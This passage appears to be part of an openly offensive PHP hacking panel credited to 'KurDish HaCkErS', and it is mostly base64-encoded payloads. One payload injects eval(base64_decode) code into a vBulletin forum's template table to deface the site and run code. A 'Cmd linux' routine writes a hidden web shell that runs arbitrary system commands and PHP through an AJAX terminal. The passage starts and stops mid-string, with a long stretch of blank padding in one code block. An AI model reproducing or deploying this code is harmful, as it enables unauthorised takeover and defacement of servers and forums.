yaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCgkgIAlmb250LXNpemU6IHh4LWxhcmdlOw0KCSAgfQ0KCSAgLnN0eWxlNyB7DQoJICAJY29sb3I6ICNGRkZGRkY7DQoJICAJZm9udC1mYW1pbHk6ICJDb3VyaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCgkgIAlmb250LXNpemU6IHh4LWxhcmdlOw0KCSAgfQ0KCSAgLnN0eWxlOCB7DQoJICAJZm9udC1mYW1pbHk6ICJDb3VyaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCgkgIAlmb250LXNpemU6IHh4LWxhcmdlOw0KCSAgCWNvbG9yOiAjODA4MDAwOw0KCSAgfQ0KCSAgLnN0eWxlOSB7DQoJCSAgZm9udC1zaXplOiA1MHB0Ow0KCQkgIGZvbnQtZmFtaWx5OiAiQ291cmllciBOZXciLCBDb3VyaWVyLCBtb25vc3BhY2U7DQoJICB9DQoJICAuc3R5bGUxMCB7DQoJCSAgY29sb3I6ICM2NjY2NjY7DQoJICB9DQoJICAuc3R5bGUxMSB7DQoJICAJY29sb3I6ICMwMDgwODA7DQoJICB9DQoJICAuc3R5bGUxMiB7DQoJCSAgY29sb3I6ICNGRjAwMDA7DQoJICB9DQoJICAuc3R5bGUxMyB7DQoJCSAgY29sb3I6ICMwMEZGMDA7DQoJICB9DQoJICAuc3R5bGUxNCB7DQoJCSAgY29sb3I6ICMwMEZGRkY7DQoJICB9DQoJICAuc3R5bGUxNSB7DQoJICAJY29sb3I6ICM4MDgwMDA7DQoJICB9DQoJICAuc3R5bGUxNiB7DQoJICAJY29sb3I6ICNGRkZGRkY7DQoJICB9DQoJICAuc3R5bGUxNyB7DQoJCSAgY29sb3I6ICMwMDgwMDA7DQoJICB9DQoJICAuc3R5bGUxOCB7DQoJCSAgY29sb3I6ICM4MDAwMDA7DQoJICB9DQoJICAuc3R5bGU2IHsNCgkgIAlmb250LWZhbWlseTogIkNvdXJpZXIgTmV3IiwgQ291cmllciwgbW9ub3NwYWNlOw0KCSAgCWZvbnQtc2l6ZTogc21hbGw7DQoJICB9DQoJICAuc3R5bGUyMCB7DQoJICAJZm9udC1mYW1pbHk6ICJDb3VyaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCgkgIH0NCgkgIC5zdHlsZTIxIHsNCgkgIAlmb250LWZhbWlseTogIkNvdXJpZXIgTmV3IiwgQ291cmllciwgbW9ub3NwYWNlOw0KCSAgCWZvbnQtc2l6ZTogMTVwdDsNCgkgIH0NCgkgIDwvc3R5bGU+DQo8aGVhZD4NCiAgPHRpdGxlPkt1ckRpc2ggSGFDa0VyUyZuYnNwOyBDaGFuZ2VyIHBhZ2VzIEZvciB2QnVsbGV0aW48L3RpdGxlPg0KICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+DQo8L2hlYWQ+DQogICAgICAgPGJvZHkgYmdjb2xvcj0iYmxhY2siIHRleHQ9IiM3YTdjN2QiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHA6Ly9kZXNpZ25iZWVwLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAxMC8wNS8xMi5zbW9rZS1waG90b2dyYXBoeS02ODJ4MTAyNC5qcGcnKTsgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZCI+DQogICAgICAgPGRpdiBhbGlnbj0iY2VudGVyIj4NCiAgICAgIA0KCQkgICA8c3BhbiBjbGFzcz0ic3R5bGU5Ij48YSBocmVmPSJodHRwczovL3d3dy5mYWNlYm9vay5jb20va3VyZGlzaC5jeWJlciI+PHNwYW4gY2xhc3M9InN0eWxlMTAiPjxzdHJvbmc+Szwvc3Ryb25nPjwvc3Bhbj48c3BhbiBjbGFzcz0ic3R5bGUxMSI+PHN0cm9uZz51PC9zdHJvbmc+PC9zcGFuPjxzcGFuIGNsYXNzPSJzdHlsZTEyIj48c3Ryb25nPnI8L3N0cm9uZz48L3NwYW4+PHNwYW4gY2xhc3M9InN0eWxlMTEiPjxzdHJvbmc+Ljwvc3Ryb25nPjwvc3Bhbj48c3BhbiBjbGFzcz0ic3R5bGUxNiI+PHN0cm9uZz5SPC9zdHJvbmc+PC9zcGFuPjxzcGFuIGNsYXNzPSJzdHlsZTE1Ij48c3Ryb25nPkRpc2g8L3N0cm9uZz48L3NwYW4+PHNwYW4gY2xhc3M9InN0eWxlMTQiPjxzdHJvbmc+Qzwvc3Ryb25nPjwvc3Bhbj48c3BhbiBjbGFzcz0ic3R5bGUxOCI+PHN0cm9uZz55PC9zdHJvbmc+PC9zcGFuPjxzcGFuIGNsYXNzPSJzdHlsZTE3Ij48c3Ryb25nPkI8L3N0cm9uZz48L3NwYW4+PHNwYW4gY2xhc3M9InN0eWxlMTEiPjxzdHJvbmc+Ljwvc3Ryb25nPjwvc3Bhbj48c3BhbiBjbGFzcz0ic3R5bGUxNCI+PHN0cm9uZz5yPC9zdHJvbmc+PC9zcGFuPjxzcGFuIGNsYXNzPSJzdHlsZTEzIj48c3Ryb25nPkE8L3N0cm9uZz48L3NwYW4+PHN0cm9uZz48c3BhbiBjbGFzcz0ic3R5bGUxNSI+cm15PC9zcGFuPjwvc3Ryb25nPjwvYT48L3NwYW4+DQogICAgICAJICAgPGJyPg0KCQkgICA8c3BhbiBjbGFzcz0ic3R5bGUyMCI+PHNwYW4gY2xhc3M9InN0eWxlMjEiPjxzcGFuIGNsYXNzPSJzdHlsZTExIj4NCgkJICAgUG93ZXJlZCBieSA8L3NwYW4+PGEgY2xhc3M9InN0eWxlMTEiIGhyZWY9Img0a3VyZDAwN0BnbWFpbC5jb20iPg0KCQkgICBNci5BbGkgSEF3bGVSeTwvYT48c3BhbiBjbGFzcz0ic3R5bGUxMSI+ICZhbXA7IDwvc3Bhbj4NCgkJICAgPGEgY2xhc3M9InN0eWxlMTEiIGhyZWY9Im1haWx0bzphbGxpLmhhd2xsZXJ5QGdtYWlsLmNvbSI+TVIuUmVkSGF0PC9hPjwvc3Bhbj48L3NwYW4+PHNwYW4gY2xhc3M9InN0eWxlMTEiPjxzcGFuIGNsYXNzPSJzdHlsZTIwIj48c3BhbiBjbGFzcz0ic3R5bGUyMSI+IA0KCQkgICCuPC9zcGFuPjwvc3Bhbj48c3BhbiBjbGFzcz0ic3R5bGU5Ij48c3BhbiBjbGFzcz0ic3R5bGU2Ij4gPGJyPjwvc3Bhbj4NCgkJICAgPC9zcGFuPjwvc3Bhbj4NCiAgICAgIDw/DQoNCmlmKGVtcHR5KCRfUE9TVFsnaW5kZXgnXSkpew0KZWNobyAiPEZPUk0gbWV0aG9kPVwiUE9TVFwiPg0KaG9zdCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cImxvY2FsaG9zdFwiIG5hbWU9XCJsb2NhbGhvc3RcIiB0eXBlPVwidGV4dFwiPg0KZGF0YWJhc2UgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJmb3J1bV92YlwiIG5hbWU9XCJkYXRhYmFzZVwiIHR5cGU9XCJ0ZXh0XCI+PGJyPg0KdXNlcm5hbWUgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJmb3J1bV92YlwiIG5hbWU9XCJ1c2VybmFtZVwiIHR5cGU9XCJ0ZXh0XCI+DQpwYXNzd29yZCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cInZiXCIgbmFtZT1cInBhc3N3b3JkXCIgdHlwZT1cInBhc3N3b3JkXCI+PGJyPg0KICAgICAgPGJyPg0KPHRleHRhcmVhIG5hbWU9XCJpbmRleFwiIGNvbHM9XCI3MFwiIHJvd3M9XCIzMFwiPkhhQ2szRCBCeSBLdXJEaXNoIEhhQ2tlclM8L3RleHRhcmVhPjxicj4NCjxJTlBVVCB2YWx1ZT1cIlNldFwiIG5hbWU9XCJzZW5kXCIgdHlwZT1cInN1Ym1pdFwiPg0KPC9GT1JNPiI7DQp9ZWxzZXsNCiRsb2NhbGhvc3QgPSAkX1BPU1RbJ2xvY2FsaG9zdCddOw0KJGRhdGFiYXNlICA9ICRfUE9TVFsnZGF0YWJhc2UnXTsNCiR1c2VybmFtZSAgPSAkX1BPU1RbJ3VzZXJuYW1lJ107DQokcGFzc3dvcmQgID0gJF9QT1NUWydwYXNzd29yZCddOw0KJGluZGV4ICAgICA9ICRfUE9TVFsnaW5kZXgnXTsNCiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRsb2NhbGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCkgb3IgZGllKG15c3FsX2Vycm9yKCkpOw0KICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGF0YWJhc2UpIG9yIGRpZShteXNxbF9lcnJvcigpKTsNCg0KJGluZGV4PXN0cl9yZXBsYWNlKCJcJyIsIiciLCRpbmRleCk7DQoNCiRzZXRfaW5kZXggID0gIntcJHtldmFsKGJhc2U2NF9kZWNvZGUoXCciOw0KDQokc2V0X2luZGV4IC49IGJhc2U2NF9lbmNvZGUoImVjaG8gXCIkaW5kZXhcIjsiKTsNCg0KDQokc2V0X2luZGV4IC49ICJcJykpfX17XCR7ZXhpdCgpfX08L3RleHRhcmVhPiI7DQoNCiRvaz1AbXlzcWxfcXVlcnkoIlVQREFURSB0ZW1wbGF0ZSBTRVQgdGVtcGxhdGUgPSciLiRzZXRfaW5kZXguIicgV0hFUkUgdGl0bGUgPSdzcGFjZXJfb3BlbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7DQoNCmlmKCRvayl7DQplY2hvICIhISB1cGRhdGUgZmluaXNoICEhPGJyPjxicj4iOw0KfQ0KDQp9DQojIEZvb3Rlcg0KZWNobyAiIjsNCj8+';

$file = fopen("..php" ,"w+");
$write = fwrite ($file ,base64_decode($ssss));
fclose($file);
echo "<iframe src=.chnger/..php width=90% height=120% ></iframe><br><br> ";

}
?>
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=cgikurd value="cgi perl and bc"> ]]==--</font></form>
<p>
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
?>
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=cmdho value="Cmd linux"> ]]==--</font></form>
<p>
<?php
if(isset($_POST['cmdho']))
{
error_reporting(0);
mkdir('.cmd', 0755);
    chdir('.cmd');      
        fclose ($mkdirr);
$sss= 'PD9waHANCi8vZGlzYWJsZSBtYWdpYyBxdW90ZXMhIQ0KZXJyb3JfcmVwb3J0aW5nKEVfQUxMXkVfTk9USUNFKTsNCiR0ZiA9IGV4cGxvZGUoJy8nLCAkX1NFUlZFUlsiU0NSSVBUX05BTUUiXSk7DQokdGYgPSAkdGZbY291bnQoJHRmKS0xXTsNCmlmIChnZXRfbWFnaWNfcXVvdGVzX2dwYygpKQ0Kew0KICRwcm9jZXNzID0gYXJyYXkoJiRfR0VULCAmJF9QT1NULCAmJF9DT09LSUUsICYkX1JFUVVFU1QpOw0KIHdoaWxlIChsaXN0KCRrZXksICR2YWwpID0gZWFjaCgkcHJvY2VzcykpDQogew0KICBmb3JlYWNoICgkdmFsIGFzICRrID0+ICR2KQ0KICB7DQogICB1bnNldCgkcHJvY2Vzc1ska2V5XVska10pOw0KICAgaWYgKGlzX2FycmF5KCR2KSkNCiAgIHsNCiAgICAkcHJvY2Vzc1ska2V5XVtzdHJpcHNsYXNoZXMoJGspXSA9ICR2Ow0KICAgICRwcm9jZXNzW10gPSAmJHByb2Nlc3NbJGtleV1bc3RyaXBzbGFzaGVzKCRrKV07DQogICB9DQogICBlbHNlDQogICB7DQogICAgJHByb2Nlc3NbJGtleV1bc3RyaXBzbGFzaGVzKCRrKV0gPSBzdHJpcHNsYXNoZXMoJHYpOw0KICAgfQ0KICB9DQogfQ0KIHVuc2V0KCRwcm9jZXNzKTsNCn0NCi8vDQpmdW5jdGlvbiBzaGVsbF9leGVjMigkc3RyLCAkY3dkKQ0Kew0KICRwaXBlcyA9IGFycmF5KCk7DQogJHByb2Nlc3MgPSBwcm9jX29wZW4oJHN0ci4nIDI+JjEnLCBhcnJheShhcnJheSgicGlwZSIsInciKSwgYXJyYXkoInBpcGUiLCJ3IiksIGFycmF5KCJwaXBlIiwidyIpKSwgJHBpcGVzLCAkY3dkKTsNCiByZXR1cm4gc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pOw0KfQ0KaWYgKCRfUE9TVFsndmVyaWZ5J10pDQp7DQogJGRpcm5vdyA9IHNoZWxsX2V4ZWMyKCJwd2QiLCAkX1BPU1RbJ3ZlcmlmeSddKTsNCiBpZiAoc3Vic3RyKCRkaXJub3csIDAsIHN0cmxlbigkZGlybm93KS0xKT09JF9QT1NUWyd2ZXJpZnknXSkNCiB7DQogIGVjaG8oJ2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuIjsgIG5ld2NtZCgpOycpOw0KIH0NCiBlbHNlDQogew0KICAkZWUgPSBleHBsb2RlKCcvJywgJF9QT1NUWyd2ZXJpZnknXSk7DQogIGVjaG8oJ2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuYmFzaDogY2Q6ICcuJF9QT1NUWyd2ZXJpZnknXS4nOiBQZXJtaXNzaW9uIGRlbmllZCFcbiI7ICBuZXdjbWQoKTsnKTsNCiB9DQogZXhpdDsNCn0NCmlmICgkX1BPU1RbJ2p4Y21kJ10gJiYgJF9QT1NUWydjd2QnXSkgLy95ZWEsIGdvIEFKQVgNCnsNCiAkdGhlY21kID0gJF9QT1NUWydqeGNtZCddOw0KIGlmIChzdWJzdHIoJHRoZWNtZCwgMCwgNSk9PSI8cGhwPiIpDQogew0KICBldmFsKCckcmVzdWx0ID0gJy5zdWJzdHIoJHRoZWNtZCwgNikuJzsnKTsNCiB9DQogZWxzZQ0KICRyZXN1bHQgPSBzaGVsbF9leGVjMigkX1BPU1RbJ2p4Y21kJ10uIiAyPiYxIiwgJF9QT1NUWydjd2QnXSk7DQogaWYgKHN1YnN0cigkcmVzdWx0LCBzdHJsZW4oJHJlc3VsdCktMSwgMSk9PSJcbiIpDQogew0KICAkcmVzdWx0ID0gc3Vic3RyKCRyZXN1bHQsIDAsIHN0cmxlbigkcmVzdWx0KS0xKTsNCiB9DQogZWNobygnZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSs9Jy5qc29uX2VuY29kZSgkcmVzdWx0KS4nKyJcbiI7bmV3Y21kKCk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zY3JvbGxUb3A9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zY3JvbGxIZWlnaHQ7Jyk7DQogZXhpdDsNCn0NCmVjaG8oJzxzdHlsZT5ib2R5IHtiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBmb250LXNpemU6IDEycHg7fTwvc3R5bGU+PHNjcmlwdD4nKTsgPz4NCndpbmRvdy5vbmxvYWQgPSBzZXR0aGVzaXplOw0Kd2luZG93Lm9ucmVzaXplID0gc2V0dGhlc2l6ZTsNCndpbmRvdy51cGRpciA9IDA7DQp3aW5kb3cuY29tbWFuZHMgPSBuZXcgQXJyYXkoKTsNCndpbmRvdy5sb2dnZWR1c2VyID0gIjw/cGhwDQokY21kID0gc2hlbGxfZXhlYzIoIndob2FtaSIsIE5VTEwpOw0KaWYgKHN0cnBvcygkY21kLCAibm90IGZvdW5kIik9PT1GQUxTRSkNCnsNCiBlY2hvKHN1YnN0cigkY21kLCAwLCBzdHJsZW4oJGNtZCktMSkpOyANCn0NCj8+IjsNCndpbmRvdy5jd2QgPSAiPD9waHANCiRjbWQgPSBzaGVsbF9leGVjMigicHdkIiwgTlVMTCk7DQppZiAoc3RycG9zKCRjbWQsICJub3QgZm91bmQiKT09PUZBTFNFKQ0Kew0KIGVjaG8oc3Vic3RyKCRjbWQsIDAsIHN0cmxlbigkY21kKS0xKSk7IA0KfQ0KPz4iOw0Kd2luZG93LmhvbWVjd2QgPSAiPD9waHANCiRjbWQgPSBzaGVsbF9leGVjMigicHdkIiwgTlVMTCk7DQppZiAoc3RycG9zKCRjbWQsICJub3QgZm91bmQiKT09PUZBTFNFKQ0Kew0KIGVjaG8oc3Vic3RyKCRjbWQsIDAsIHN0cmxlbigkY21kKS0xKSk7IA0KfQ0KPz4iOw0KZnVuY3Rpb24gc2V0dGhlc2l6ZSgpDQp7DQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zdHlsZS5oZWlnaHQ9KHdpbmRvdy5pbm5lckhlaWdodC0yMCkrInB4IjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnN0eWxlLndpZHRoPSh3aW5kb3cuaW5uZXJXaWR0aC0yMCkrInB4IjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNlbGVjdGlvblN0YXJ0PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUubGVuZ3RoOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2VsZWN0aW9uRW5kPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUubGVuZ3RoOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIGFwcGVuZGRpcmVjdG9yeShzdHIpDQp7DQogaWYgKHN0ci5zdWJzdHIoMCwgMSk9PSIvIikNCiB3aW5kb3cuY3dkID0gc3RyOw0KIGVsc2UNCiB7DQogIHZhciBjID0gd2luZG93LmN3ZCsiLyIrc3RyOw0KICB2YXIgcmVhbCA9IG5ldyBBcnJheSgpOw0KICBjID0gYy5zcGxpdCgiLyIpOyB2YXIgaTsNCiAgZm9yKGk9MDtpPGMubGVuZ3RoO2krKykNCiAgew0KICAgaWYgKChjW2ldID09ICIuLiIpICYmIHJlYWwubGVuZ3RoPjApDQogICB7DQogICAgcmVhbC5zcGxpY2UocmVhbC5sZW5ndGgtMSwgMSk7DQogICB9DQogICBlbHNlIGlmICgoY1tpXSAhPSAiLiIpICYmIChjW2ldICE9ICIiKSkNCiAgIHJlYWwucHVzaChjW2ldKTsNCiAgfQ0KICB3aW5kb3cuY3dkID0gIi8iK3JlYWwuam9pbigiLyIpOw0KIH0NCn0NCmZ1bmN0aW9uIHdyaXRlbGFzdGxpbmUoc3RyKQ0Kew0KIHZhciBjYWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZS5zcGxpdCgiXG4iKSwgaTsNCiBjYWxsW2NhbGwubGVuZ3RoLTFdID0gc3RyOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgPSBjYWxsLmpvaW4oIlxuIik7DQp9DQpmdW5jdGlvbiBjbWR1cChlKQ0Kew0KIGlmICh3aW5kb3cuY29tbWFuZHMubGVuZ3RoPih3aW5kb3cudXBkaXIpKQ0KIHsNCiAgd2luZG93LnVwZGlyKys7DQogIHdyaXRlbGFzdGxpbmUoIiIpOw0KICBuZXdjbWQoKTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSArPSB3aW5kb3cuY29tbWFuZHNbd2luZG93LmNvbW1hbmRzLmxlbmd0aC13aW5kb3cudXBkaXJdOw0KIH0NCiBpZiAoZS5zdG9wUHJvcGFnYXRpb24pDQogew0KICBlLnN0b3BQcm9wYWdhdGlvbigpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsVG9wPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsSGVpZ2h0Ow0KfQ0KZnVuY3Rpb24gY21kb3duKGUpDQp7DQogaWYgKHdpbmRvdy51cGRpcj4xKQ0KIHsNCiAgd2luZG93LnVwZGlyLS07DQogIHdyaXRlbGFzdGxpbmUoIiIpOw0KICBuZXdjbWQoKTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSArPSB3aW5kb3cuY29tbWFuZHNbd2luZG93LmNvbW1hbmRzLmxlbmd0aC13aW5kb3cudXBkaXJdOw0KIH0NCiBpZiAoZS5zdG9wUHJvcGFnYXRpb24pDQogew0KICBlLnN0b3BQcm9wYWdhdGlvbigpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsVG9wPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsSGVpZ2h0Ow0KfQ0KZnVuY3Rpb24gcG9zdEFzeW5jaHJvbm91c0FqYXgodXJsLCB2YWx1ZXMpDQp7DQogdmFyIHhtbGh0dHA7DQogaWYgKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCkNCiB7DQogIHhtbGh0dHA9bmV3IFhNTEh0dHBSZXF1ZXN0KCkNCiAgeG1saHR0cC5vcGVuKCJQT1NUIix1cmwsdHJ1ZSk7DQogIHhtbGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOw0KICB4bWxodHRwLnNlbmQodmFsdWVzKTsNCiAgeG1saHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKQ0KICB7DQogICBpZiAoeG1saHR0cC5yZWFkeVN0YXRlPT00KQ0KICAgew0KICAgIGlmICh4bWxodHRwLnN0YXR1cz09MjAwKQ0KICAgIHsNCiAgICAgZXZhbCh4bWxodHRwLnJlc3BvbnNlVGV4dCk7DQogICAgfQ0KICAgfQ0KICB9DQogfQ0KIGVsc2UgaWYgKHdpbmRvdy5BY3RpdmVYT2JqZWN0KQ0KIHsNCiAgeG1saHR0cD1uZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQ0KICBpZiAoeG1saHR0cCkNCiAgew0KICAgeG1saHR0cC5vcGVuKCJQT1NUIix1cmwsdHJ1ZSk7DQogICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsNCiAgIHhtbGh0dHAuc2VuZCh2YWx1ZXMpOw0KICAgeG1saHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKQ0KICAgew0KICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGU9PTQpDQogICAgew0KICAgICBpZiAoeG1saHR0cC5zdGF0dXM9PTIwMCkNCiAgICAgew0KICAgICAgZXZhbCh4bWxodHRwLnJlc3BvbnNlVGV4dCk7DQogICAgIH0NCiAgICB9DQogICB9DQogIH0NCiB9DQp9DQpmdW5jdGlvbiB1cmxlbmNvZGUgKHN0cikNCnsNCiByZXR1cm4gZW5jb2RlVVJJQ29tcG9uZW50KHN0cikucmVwbGFjZSgvIS9nLCAnJTIxJykucmVwbGFjZSgvJy9nLCAnJTI3JykucmVwbGFjZSgvXCgvZywgJyUyOCcpLg0KIHJlcGxhY2UoL1wpL2csICclMjknKS5yZXBsYWNlKC9cKi9nLCAnJTJBJykucmVwbGFjZSgvJTIwL2csICcrJyk7DQp9DQpmdW5jdGlvbiBuZXdjbWQoKQ0Kew0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlsiK3dpbmRvdy5sb2dnZWR1c2VyKyJAPD9waHAgZWNobygkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOyA/PiAiKygod2luZG93LmN3ZD09Ii8iKT8oIi8iKTood2luZG93LmN3ZC5zcGxpdCgiLyIpW3dpbmRvdy5jd2Quc3BsaXQoIi8iKS5sZW5ndGgtMV0pKSsiXSMgIjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbFRvcD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbEhlaWdodDsNCn0NCmZ1bmN0aW9uIGV4ZWMoZSkNCnsNCiB3aW5kb3cudXBkaXI9MDsNCiB2YXIgYWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZS5zcGxpdCgiXG4iKTsNCiBpZiAoYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpPT0iY2xlYXIiKQ0KIHsNCiAgd2luZG93LmNvbW1hbmRzID0gbmV3IEFycmF5KCk7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWU9IiI7DQogIG5ld2NtZCgpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGVsc2UgaWYgKGFsbFthbGwubG